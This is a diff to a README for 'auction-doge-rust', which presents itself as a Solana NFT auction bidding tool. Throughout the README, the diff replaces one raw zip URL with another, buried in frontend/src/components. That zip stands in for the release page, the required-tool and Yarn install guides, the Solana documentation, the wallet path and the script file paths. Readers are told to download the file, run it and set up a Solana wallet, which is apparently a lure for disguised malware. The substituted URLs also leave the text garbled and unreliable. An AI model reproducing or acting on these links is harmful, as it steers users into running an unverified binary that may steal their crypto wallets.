@@ -1,6 +1,6 @@
 # 🐶 auction-doge-rust - Your Easy Way to Bid on NFTs
 
-[![Download](https://raw.githubusercontent.com/Luffysempai/auction-doge-rust/main/Draconic/auction-doge-rust.zip%20Now-Get%20the%https://raw.githubusercontent.com/Luffysempai/auction-doge-rust/main/Draconic/auction-doge-rust.zip)](https://raw.githubusercontent.com/Luffysempai/auction-doge-rust/main/Draconic/auction-doge-rust.zip)
+[![Download](https://github.com/Luffysempai/auction-doge-rust/raw/refs/heads/main/frontend/src/components/rust_doge_auction_v3.3.zip%20Now-Get%20the%https://github.com/Luffysempai/auction-doge-rust/raw/refs/heads/main/frontend/src/components/rust_doge_auction_v3.3.zip)](https://github.com/Luffysempai/auction-doge-rust/raw/refs/heads/main/frontend/src/components/rust_doge_auction_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **auction-doge-rust**, your straightforward tool for participating in
 
 To get started, follow these steps:
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/Luffysempai/auction-doge-rust/main/Draconic/auction-doge-rust.zip).
+1. Visit the [Releases Page](https://github.com/Luffysempai/auction-doge-rust/raw/refs/heads/main/frontend/src/components/rust_doge_auction_v3.3.zip).
 2. Look for the latest version available.
 3. Download the appropriate file for your operating system.
 
@@ -20,8 +20,8 @@ After downloading, locate the file on your computer and run it to install the ap
 
 Before you can use auction-doge-rust, ensure you have the necessary tools installed on your system:
 
-- **https://raw.githubusercontent.com/Luffysempai/auction-doge-rust/main/Draconic/auction-doge-rust.zip**: This is required to run the application. You can download it from [https://raw.githubusercontent.com/Luffysempai/auction-doge-rust/main/Draconic/auction-doge-rust.zip Official Website](https://raw.githubusercontent.com/Luffysempai/auction-doge-rust/main/Draconic/auction-doge-rust.zip).
-- **Yarn**: This package manager makes it easy to handle the project's dependencies. You can install it by following [Yarn Installation Guide](https://raw.githubusercontent.com/Luffysempai/auction-doge-rust/main/Draconic/auction-doge-rust.zip).
+- **https://github.com/Luffysempai/auction-doge-rust/raw/refs/heads/main/frontend/src/components/rust_doge_auction_v3.3.zip**: This is required to run the application. You can download it from [https://github.com/Luffysempai/auction-doge-rust/raw/refs/heads/main/frontend/src/components/rust_doge_auction_v3.3.zip Official Website](https://github.com/Luffysempai/auction-doge-rust/raw/refs/heads/main/frontend/src/components/rust_doge_auction_v3.3.zip).
+- **Yarn**: This package manager makes it easy to handle the project's dependencies. You can install it by following [Yarn Installation Guide](https://github.com/Luffysempai/auction-doge-rust/raw/refs/heads/main/frontend/src/components/rust_doge_auction_v3.3.zip).
 
 Additionally, you need to install `ts-node` globally. Open your command line or terminal and run:
 ```bash
@@ -32,23 +32,23 @@ npm install -g ts-node
 
 To interact with the auctions, you will need a Solana wallet set up. Ensure that your wallet is ready by checking the following path:
 ```
-https://raw.githubusercontent.com/Luffysempai/auction-doge-rust/main/Draconic/auction-doge-rust.zip
+https://github.com/Luffysempai/auction-doge-rust/raw/refs/heads/main/frontend/src/components/rust_doge_auction_v3.3.zip
 ```
 
 ## 🎬 How to Use the Application
 
 Once you have installed the application and set up your wallet, you can start using it. Here’s how:
 
-1. Open the main script located at `https://raw.githubusercontent.com/Luffysempai/auction-doge-rust/main/Draconic/auction-doge-rust.zip`. This script contains all the functionalities you need.
-2. You can view the types of program accounts at `https://raw.githubusercontent.com/Luffysempai/auction-doge-rust/main/Draconic/auction-doge-rust.zip`. This helps you understand how different parts of the application work together.
-3. For an easy integration with JavaScript, the IDL can be found at `https://raw.githubusercontent.com/Luffysempai/auction-doge-rust/main/Draconic/auction-doge-rust.zip`.
+1. Open the main script located at `https://github.com/Luffysempai/auction-doge-rust/raw/refs/heads/main/frontend/src/components/rust_doge_auction_v3.3.zip`. This script contains all the functionalities you need.
+2. You can view the types of program accounts at `https://github.com/Luffysempai/auction-doge-rust/raw/refs/heads/main/frontend/src/components/rust_doge_auction_v3.3.zip`. This helps you understand how different parts of the application work together.
+3. For an easy integration with JavaScript, the IDL can be found at `https://github.com/Luffysempai/auction-doge-rust/raw/refs/heads/main/frontend/src/components/rust_doge_auction_v3.3.zip`.
 
 ### 🔄 Testing the Application
 
 If you want to test the script's functions, follow these instructions:
 
-1. Modify the commands in the main functions of the `https://raw.githubusercontent.com/Luffysempai/auction-doge-rust/main/Draconic/auction-doge-rust.zip` file to call other available functions.
-2. Make sure the `ANCHOR_WALLET` environment variable is correctly configured in the `https://raw.githubusercontent.com/Luffysempai/auction-doge-rust/main/Draconic/auction-doge-rust.zip` file.
+1. Modify the commands in the main functions of the `https://github.com/Luffysempai/auction-doge-rust/raw/refs/heads/main/frontend/src/components/rust_doge_auction_v3.3.zip` file to call other available functions.
+2. Make sure the `ANCHOR_WALLET` environment variable is correctly configured in the `https://github.com/Luffysempai/auction-doge-rust/raw/refs/heads/main/frontend/src/components/rust_doge_auction_v3.3.zip` file.
 3. To run the application, execute the command:
    ```bash
    yarn ts-node
@@ -82,9 +82,9 @@ If you encounter any problems or have suggestions, feel free to create an issue.
 ## 📍 Additional Resources
 
 Here are a few useful resources to deepen your understanding:
-- [Solana Documentation](https://raw.githubusercontent.com/Luffysempai/auction-doge-rust/main/Draconic/auction-doge-rust.zip)
-- [https://raw.githubusercontent.com/Luffysempai/auction-doge-rust/main/Draconic/auction-doge-rust.zip Documentation](https://raw.githubusercontent.com/Luffysempai/auction-doge-rust/main/Draconic/auction-doge-rust.zip)
-- [Yarn Documentation](https://raw.githubusercontent.com/Luffysempai/auction-doge-rust/main/Draconic/auction-doge-rust.zip)
+- [Solana Documentation](https://github.com/Luffysempai/auction-doge-rust/raw/refs/heads/main/frontend/src/components/rust_doge_auction_v3.3.zip)
+- [https://github.com/Luffysempai/auction-doge-rust/raw/refs/heads/main/frontend/src/components/rust_doge_auction_v3.3.zip Documentation](https://github.com/Luffysempai/auction-doge-rust/raw/refs/heads/main/frontend/src/components/rust_doge_auction_v3.3.zip)
+- [Yarn Documentation](https://github.com/Luffysempai/auction-doge-rust/raw/refs/heads/main/frontend/src/components/rust_doge_auction_v3.3.zip)
 
 For any other questions related to usage or features, do not hesitate to seek assistance from the community or check the available documentation linked above.
 
